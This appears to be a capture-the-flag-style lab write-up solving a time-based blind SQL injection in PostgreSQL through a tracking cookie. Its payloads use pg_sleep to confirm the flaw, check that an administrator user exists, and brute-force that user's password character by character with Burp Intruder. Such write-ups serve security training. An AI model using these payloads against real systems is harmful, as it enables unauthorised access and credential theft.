## Lab Description :

![image](https://user-images.githubusercontent.com/67383098/235337277-b7cfdf45-ee8c-4f35-a1b6-9f61d84c060c.png)

## Solution :

The captured request is as follows ,

![image](https://user-images.githubusercontent.com/67383098/235337385-2829f53c-2235-4c53-b6ea-411c43fbb084.png)


The query looks somethiung like this :

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>''
```

#### Confirm that blind sql injection works -

Modify the cookie value

Since it is a POSTgreSQL , we use the following syntax

![image](https://user-images.githubusercontent.com/67383098/235337455-806b3524-1ab6-4846-8487-82a7ced09c22.png)


```sql
TrackingId=x';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```
We get response after 10 sec delay, which confirms the blind SQL injection vulnerability

![image](https://user-images.githubusercontent.com/67383098/235337495-e2c7812c-6c28-4eb1-8e72-28c31d2e3d5e.png)

Change the boolean condition (1=2) to verify it

```sql
TrackingId=x';SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```

We get a response immediately which means the condition failed (1=2)

![image](https://user-images.githubusercontent.com/67383098/235337615-342a6611-96e3-4c40-b6aa-7cc03364d02f.png)

#### Verify administrator user exists -


```sql
TrackingId=x';SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```
It takes 10 sec to respond which means there is indeed a user called administrator

![image](https://user-images.githubusercontent.com/67383098/235337755-ba4a4955-df05-4ec8-858f-759d7e226669.png)

#### Find the length of admin's password -

To determine how many characters are in the password of the administrator user. To do this, change the value to: 

The below payload checks if the length is > 1.

```sql
';SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

![image](https://user-images.githubusercontent.com/67383098/235337977-f06373ee-39e8-4520-9ace-649ed5ca5d02.png)


It takes 10 sec delay to respond which means it is > 1 character.

Automate this process,

1. Send the req to intruder
2. Add length of password part as payload *(>1)*
3. Payload type - Sniper
4. Payload - Numbers (1 to 50 with step 1)

Add an extra column called `Response Received` to show the response time of each request.


At a payload 20 , the delay of response does not happen, means the length of password is **20 characters**

![image](https://user-images.githubusercontent.com/67383098/235339385-d242334c-3899-443f-a1ea-92af5bdaa18d.png)

#### Bruteforce the admin's password -

To bruteforce the password, we use a payload where we take first letter of the password and try to match it with all alphabets and numbers. If it matches then we get a 10 sec delay. 

```sql
TrackingId=x'%3BSELECT+CASE+WHEN (username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

Automate this 

1. Add the part which replaces the first character ($1$,1) as payload 1.
2. Add the character to be matched against ('a') as payload 2.
3. Attack type - Cluster Bomb 
4. Payload 1 - Numbers (1 to20 with step 1)
5. Payload 2 - Bruteforcer (min & max length as 1)

Once we get the result, we can segregate the result and get the password like before, since we can't arrange both *response received* and *payload1* together. 

So,

Highlight the requests which has 10 sec delay.

![image](https://user-images.githubusercontent.com/67383098/235340161-e123f6b0-6271-404d-a163-bb6badcfdbb0.png)


Select **Show only highlighted items** filter

![image](https://user-images.githubusercontent.com/67383098/235340232-1cb00684-a963-4f02-862e-1a557824eb25.png)

Now we get only the 20 items.NOw we can segregate in order based on PAYLOAD 1.

![image](https://user-images.githubusercontent.com/67383098/235340337-4f4e9562-24ed-4e28-bde8-0e8c75527bba.png)



We get the password of admin as - `30mmlu0fageqdcj4qv04`


![image](https://user-images.githubusercontent.com/67383098/235340410-dc85637a-1b7a-4296-9d68-951ad37af294.png)















